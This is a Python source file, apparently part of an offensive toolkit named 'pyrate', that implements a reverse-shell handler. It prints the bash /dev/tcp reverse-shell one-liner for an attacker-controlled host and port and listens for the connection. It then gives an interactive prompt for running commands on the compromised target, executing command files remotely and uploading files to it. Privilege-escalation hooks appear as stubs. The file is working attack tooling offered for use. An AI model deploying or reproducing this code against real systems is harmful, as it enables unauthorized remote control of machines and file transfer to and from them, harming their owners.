# @author dotPY-hax
# @author Vsevolod Ivanov

from pyrate.listener import PortListener
from pyrate.cli import CLI
from pyrate.file_transfer import FileTransfer
from pyrate.privilege_escalation import PrivilegeEscalation

class ReverseShell:
    def __init__(self, lhost, lport, rhost):
        self.lhost = lhost
        self.lport = lport
        self.rhost = rhost
        self.simple_reverse_shell_bash = 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=lhost, port=lport)
        self.cli = CLI()
        self.cli.cli_print(self.simple_reverse_shell_bash)
        self.listener = PortListener(lhost, lport)
        self.running = True

    def handle_initial_data(self):
        initial_data = self.listener.receive_data()
        self.cli.cli_print(initial_data)

    def main_loop(self):
        self.handle_initial_data()
        print('type q to quit')
        while self.running:
            self.cli.prompt_text = '$ '
            new_command = self.cli.cli_prompt()
            new_command = self.handle_command(new_command)
            if (new_command):
                self.run_command_and_print(new_command)

    def run_command_and_print(self, command):
        return_value = self.listener.send_receive(command)
        self.cli.cli_print(return_value)
        return return_value

    def handle_command(self, command):
        if command.lower() in ['q']:
            self.running = False
            return ''
        elif command.lower() == 'h':
            print('actions: [r]un, [u]pload, [d]ownload, [h]elp')
            return ''
        elif command.lower() == 'r':
            arg = input('run file commands: <src> ')
            self.commands_from_local_file(arg)
            return ''
        elif command.lower() == 'u':
            args = input('upload file: <src> <dest> ')
            args = args.split(' ')
            self.send_file(args[0], args[1])
            return ''
        # TODO
        elif command.lower() == 'd':
            print('not implemented')
        #    args = input('download file: <src> <dest> ')
        #    args = args.split(' ')
        #    self.receive_file(args[0], args[1])
            return ''
        #elif command.lower() == 'privesc':
        #    self.search_for_privesc()
        #    return ''
        return command + '\n'

    def commands_from_local_file(self, local_file):
        with open(local_file, 'r') as run_this:
            for line in run_this.readlines():
                return_value = self.listener.send_receive(line)
                self.cli.cli_print(return_value)

    def send_file(self, src, dest):
        file_transfer = FileTransfer(self.lhost, self.lport + 1, self)
        file_transfer.host_to_target(src, dest)
        file_transfer.close()

    def receive_file(self, src, dest):
        file_transfer = FileTransfer(self.lhost, self.lport + 1, self)
        file_transfer.target_to_host(src, dest)
        file_transfer.close()

    def search_for_privesc(self):
        privilege_escalation = PrivilegeEscalation(self)
        privilege_escalation.search_for_privesc()
